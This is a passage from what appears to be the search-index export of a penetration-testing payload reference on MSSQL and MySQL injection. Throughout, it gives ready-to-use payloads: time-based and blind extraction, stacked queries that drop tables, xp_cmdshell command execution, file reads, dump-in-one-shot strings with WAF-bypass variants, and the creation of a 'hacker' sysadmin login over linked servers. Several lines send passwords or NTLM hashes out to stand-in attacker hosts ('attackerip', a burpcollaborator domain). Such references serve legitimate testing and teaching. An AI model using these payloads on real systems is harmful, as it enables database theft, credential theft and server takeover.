'0:0:10'--\nProductID=1);waitfor delay '0:0:10'--\nProductID=1';waitfor delay '0:0:10'--\nProductID=1');waitfor delay '0:0:10'--\nProductID=1));waitfor delay '0:0:10'--\nIF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-stacked-query","title":"MSSQL Stacked Query","text":"<p>Use a semi-colon \";\" to add another query</p> <pre><code>ProductID=1; DROP members--\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-read-file","title":"MSSQL Read file","text":"<p>Permissions: The <code>BULK</code> option requires the <code>ADMINISTER BULK OPERATIONS</code> or the <code>ADMINISTER DATABASE BULK OPERATIONS</code> permission.</p> <pre><code>-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-command-execution","title":"MSSQL Command execution","text":"<pre><code>EXEC xp_cmdshell \"net user\";\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n</code></pre> <p>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)</p> <pre><code>EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n</code></pre> <p>To interact with the MSSQL instance.</p> <pre><code>sqsh -S 192.168.1.X -U sa -P superPassword\npython mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758\n</code></pre> <p>Execute Python script </p> <p>Executed by a different user than the one using xp_cmdshell to execute commands</p> <pre><code>#Print the user being used (and execute commands)\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\n#Open and read a file\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n#Multiline\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'\nimport sys\nprint(sys.version)\n'\nGO\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-out-of-band","title":"MSSQL Out of band","text":""},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-dns-exfiltration","title":"MSSQL DNS exfiltration","text":"<p>Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1</p> <pre><code># Permissions: Requires VIEW SERVER STATE permission on the server.\n1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null))\n# Permissions: Requires the CONTROL SERVER permission.\n1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default)))\n1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-unc-path","title":"MSSQL UNC Path","text":"<p>MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the <code>xp_dirtree</code> function to list the files in our SMB share and grab the NTLMv2 hash.</p> <pre><code>1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- \n</code></pre> <pre><code>xp_dirtree '\\\\attackerip\\file'\nxp_fileexist '\\\\attackerip\\file'\nBACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'\nBACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'\nRESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-make-user-dba-db-admin","title":"MSSQL Make user DBA (DB admin)","text":"<pre><code>EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-trusted-links","title":"MSSQL Trusted Links","text":"<p>The links between databases work even across forest trusts.</p> <pre><code>msf&gt; use exploit/windows/mssql/mssql_linkcrawler\n[msf&gt; set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio\n</code></pre> <p>Manual exploitation</p> <pre><code>-- find link\nselect * from master..sysservers\n-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#list-permissions","title":"List permissions","text":"<p>Listing effective permissions of current user on the server.</p> <pre><code>SELECT * FROM fn_my_permissions(NULL, 'SERVER'); </code></pre> <p>Listing effective permissions of current user on the database.</p> <pre><code>SELECT * FROM fn_my_permissions (NULL, 'DATABASE');\n</code></pre> <p>Listing effective permissions of current user on a view.</p> <pre><code>SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; \n</code></pre> <p>Check if current user is a member of the specified server role.</p> <pre><code>-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin\nSELECT is_srvrolemember('sysadmin');\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#references","title":"References","text":"<ul> <li>Pentest Monkey - mssql-sql-injection-cheat-sheet</li> <li>Error Based - SQL Injection </li> <li>MSSQL Trusted Links - HackTricks.xyz</li> <li>SQL Server \u2013 Link\u2026 Link\u2026 Link\u2026 and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013</li> <li>DAFT: Database Audit Framework &amp; Toolkit - NetSPI</li> <li>SQL Server UNC Path Injection Cheatsheet - nullbind</li> <li>Full MSSQL Injection PWNage - ZeQ3uL &amp;&amp; JabAv0C - 28 January 2009</li> <li>Microsoft - sys.fn_my_permissions (Transact-SQL)</li> <li>Microsoft - IS_SRVROLEMEMBER (Transact-SQL)</li> </ul>"},{"location":"SQL%20Injection/MySQL%20Injection/","title":"MYSQL Injection","text":""},{"location":"SQL%20Injection/MySQL%20Injection/#summary","title":"Summary","text":"<ul> <li>MYSQL Comment</li> <li>MYSQL Union Based<ul> <li>Detect columns number</li> <li>Extract database with information_schema</li> <li>Extract columns name without information_schema</li> <li>Extract data without columns name</li> </ul> </li> <li>MYSQL Error Based<ul> <li>MYSQL Error Based - Basic</li> <li>MYSQL Error Based - UpdateXML function</li> <li>MYSQL Error Based - Extractvalue function</li> </ul> </li> <li>MYSQL Blind<ul> <li>MYSQL Blind with substring equivalent</li> <li>MYSQL Blind using a conditional statement</li> <li>MYSQL Blind with MAKE_SET</li> <li>MYSQL Blind with LIKE</li> </ul> </li> <li>MYSQL Time Based<ul> <li>Using SLEEP in a subselect</li> <li>Using conditional statements</li> </ul> </li> <li>MYSQL DIOS - Dump in One Shot</li> <li>MYSQL Current queries</li> <li>MYSQL Read content of a file</li> <li>MYSQL Write a shell<ul> <li>Into outfile method</li> <li>Into dumpfile method</li> </ul> </li> <li>MYSQL UDF command execution</li> <li>MYSQL Truncation</li> <li>MYSQL Fast Exploitation</li> <li>MYSQL Out of band<ul> <li>DNS exfiltration</li> <li>UNC Path - NTLM hash stealing</li> </ul> </li> <li>References</li> </ul>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-comment","title":"MYSQL comment","text":"<pre><code># MYSQL Comment\n-- comment [Note the space after the double dash]\n/* MYSQL Comment */\n/*! MYSQL Special SQL */\n/*!32302 10*/ Comment for MYSQL version 3.23.02\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-union-based","title":"MYSQL Union Based","text":""},{"location":"SQL%20Injection/MySQL%20Injection/#detect-columns-number","title":"Detect columns number","text":"<p>First you need to know the number of columns</p>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-order-by-or-group-by","title":"Using <code>order by</code> or <code>group by</code>","text":"<p>Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.</p> <p><pre><code>1' ORDER BY 1--+    #True\n1' ORDER BY 2--+    #True\n1' ORDER BY 3--+    #True\n1' ORDER BY 4--+    #False - Query is only using 3 columns\n#-1' UNION SELECT 1,2,3--+  True\n</code></pre> or  <pre><code>1' GROUP BY 1--+    #True\n1' GROUP BY 2--+    #True\n1' GROUP BY 3--+    #True\n1' GROUP BY 4--+    #False - Query is only using 3 columns\n#-1' UNION SELECT 1,2,3--+  True\n</code></pre></p>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-order-by-or-group-by-error-based","title":"Using <code>order by</code> or <code>group by</code> Error Based","text":"<p>Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled. <pre><code>1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\n# Unknown column '4' in 'order clause'\n# This error means query uses 3 column\n#-1' UNION SELECT 1,2,3--+  True\n</code></pre> or <pre><code>1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\n# Unknown column '4' in 'group statement'\n# This error means query uses 3 column\n#-1' UNION SELECT 1,2,3--+  True\n</code></pre></p>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-union-select-error-based","title":"Using <code>UNION SELECT</code> Error Based","text":"<p>This method works if error showing is enabled <pre><code>1' UNION SELECT @--+        #The used SELECT statements have a different number of columns\n1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns\n1' UNION SELECT @,@,@--+    #No error means query uses 3 column\n                            #-1' UNION SELECT 1,2,3--+  True\n</code></pre></p>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-limit-into-error-based","title":"Using <code>LIMIT INTO</code> Error Based","text":"<p>This method works if error showing is enabled.</p> <p>It is useful for finding the number of columns when the injection point is after a LIMIT clause. <pre><code>1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns\n1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns\n1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column\n                              #-1' UNION SELECT 1,2,3--+    True\n</code></pre></p>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-select-from-some_existing_table-error-based","title":"Using <code>SELECT * FROM SOME_EXISTING_TABLE</code> Error Based","text":"<p>This works if you know the table name you're after and error showing is enabled.</p> <p>It will return the amount of columns in the table, not the query.</p> <pre><code>1' AND (SELECT * FROM Users) = 1--+     #Operand should contain 3 column(s)\n                                        # This error means query uses 3 column\n                                        #-1' UNION SELECT 1,2,3--+  True\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#extract-database-with-information_schema","title":"Extract database with information_schema","text":"<p>Then the following codes will extract the databases'name, tables'name, columns'name.</p> <pre><code>UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#extract-columns-name-without-information_schema","title":"Extract columns name without information_schema","text":"<p>Method for <code>MySQL &gt;= 4.1</code>.</p> <p>First extract the column number with  <pre><code>?id=(1)and(SELECT * from db.users)=(1)\n-- Operand should contain 4 column(s)\n</code></pre></p> <p>Then extract the column name. <pre><code>?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)\n--Column 'id' cannot be null\n</code></pre></p> <p>Method for <code>MySQL 5</code></p> <pre><code>-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a\n--#1060 - Duplicate column name 'id'\n-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a\n-- #1060 - Duplicate column name 'name'\n-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a\n...\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#extract-data-without-columns-name","title":"Extract data without columns name","text":"<p>Extracting data from the 4th column without knowing its name.</p> <pre><code>select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;\n</code></pre> <p>Injection example inside the query <code>select author_id,title from posts where author_id=[INJECT_HERE]</code></p> <pre><code>MariaDB [dummydb]&gt; select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);\n+-----------+-----------------------------------------------------------------+\n| author_id | title                                                           |\n+-----------+-----------------------------------------------------------------+\n|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n+-----------+-----------------------------------------------------------------+\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based","title":"MYSQL Error Based","text":""},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-basic","title":"MYSQL Error Based - Basic","text":"<p>Works with <code>MySQL &gt;= 4.1</code></p> <pre><code>(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))\n'+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-updatexml-function","title":"MYSQL Error Based - UpdateXML function","text":"<pre><code>AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--\n</code></pre> <p>Shorter to read:</p> <pre><code>' and updatexml(null,concat(0x0a,version()),null)-- -\n' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-extractvalue-function","title":"MYSQL Error Based - Extractvalue function","text":"<p>Works with <code>MySQL &gt;= 5.1</code></p> <pre><code>?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-name_const-function-only-for-constants","title":"MYSQL Error Based - NAME_CONST function (only for constants)","text":"<p>Works with <code>MySQL &gt;= 5.0</code></p> <pre><code>?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind","title":"MYSQL Blind","text":""},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-with-substring-equivalent","title":"MYSQL Blind with substring equivalent","text":"<pre><code>?id=1 and substring(version(),1,1)=5\n?id=1 and right(left(version(),1),1)=5\n?id=1 and left(version(),1)=4\n?id=1 and ascii(lower(substr(Version(),1,1)))=51\n?id=1 and (select mid(version(),1,1)=4)\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A'\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-sql-injection-in-order-by-clause-using-a-binary-query-and-regexp","title":"MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP","text":"<p>This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.</p> <pre><code>[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP \"^[BRUTEFORCE CHAR BY CHAR].*\" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-sql-injection-binary-query-using-regexp","title":"MySQL Blind SQL Injection binary query using REGEXP.","text":"<p>Payload: <pre><code>' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -\n</code></pre></p> <p>Would work in the query (where the \"where\" clause is the injection point): <pre><code>SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -';\n</code></pre></p> <p>In said query, it will check to see if an item exists in the \"name\" column in the \"items\" database that starts with an \"a\". If it will sleep for 3 seconds per item.</p>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-using-a-conditional-statement","title":"MYSQL Blind using a conditional statement","text":"<p>TRUE: <code>if @@version starts with a 5</code>:</p> <pre><code>2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\nResponse:\nHTTP/1.1 500 Internal Server Error\n</code></pre> <p>False: <code>if @@version starts with a 4</code>:</p> <pre><code>2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\nResponse:\nHTTP/1.1 200 OK\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-with-make_set","title":"MYSQL Blind with MAKE_SET","text":"<pre><code>AND MAKE_SET(YOLO&lt;(SELECT(length(version()))),1)\nAND MAKE_SET(YOLO&lt;ascii(substring(version(),POS,1)),1)\nAND MAKE_SET(YOLO&lt;(SELECT(length(concat(login,password)))),1)\nAND MAKE_SET(YOLO&lt;ascii(substring(concat(login,password),POS,1)),1)\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-with-like","title":"MYSQL Blind with LIKE","text":"<p>'_' acts like the regex character '.', use it to speed up your blind testing</p> <pre><code>SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-time-based","title":"MYSQL Time Based","text":"<p>The following SQL codes will delay the output from MySQL.</p> <pre><code>+BENCHMARK(40000000,SHA1(1337))+\n'%2Bbenchmark(3200,SHA1(1))%2B'\nAND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1\nRLIKE SLEEP([SLEEPTIME])\nOR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-sleep-in-a-subselect","title":"Using SLEEP in a subselect","text":"<pre><code>1 and (select sleep(10) from dual where database() like '%')#\n1 and (select sleep(10) from dual where database() like '___')# \n1 and (select sleep(10) from dual where database() like '____')#\n1 and (select sleep(10) from dual where database() like '_____')#\n1 and (select sleep(10) from dual where database() like 'a____')#\n...\n1 and (select sleep(10) from dual where database() like 's____')#\n1 and (select sleep(10) from dual where database() like 'sa___')#\n...\n1 and (select sleep(10) from dual where database() like 'sw___')#\n1 and (select sleep(10) from dual where database() like 'swa__')#\n1 and (select sleep(10) from dual where database() like 'swb__')#\n1 and (select sleep(10) from dual where database() like 'swi__')#\n...\n1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#using-conditional-statements","title":"Using conditional statements","text":"<pre><code>?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))&gt;=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))&gt;=100, 1, SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-dios-dump-in-one-shot","title":"MYSQL DIOS - Dump in One Shot","text":"<pre><code>(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] &gt; ',table_name,' &gt; ',column_name,0x7C))))a)#\n(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] &gt; ',column_data2,' &gt; ',0x7C))))a)#\n-- SecurityIdiots\nmake_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n-- Profexer\n(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)\n-- Dr.Z3r0\n(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))\n-- M@dBl00d\n(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))\n-- Zen\n+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n-- Zen WAF\n(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)\n-- ~tr0jAn WAF\n+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+\n-- ~tr0jAn Benchmark\n+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name&gt;@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name&gt;@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name&gt;@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+\n-- N1Z4M 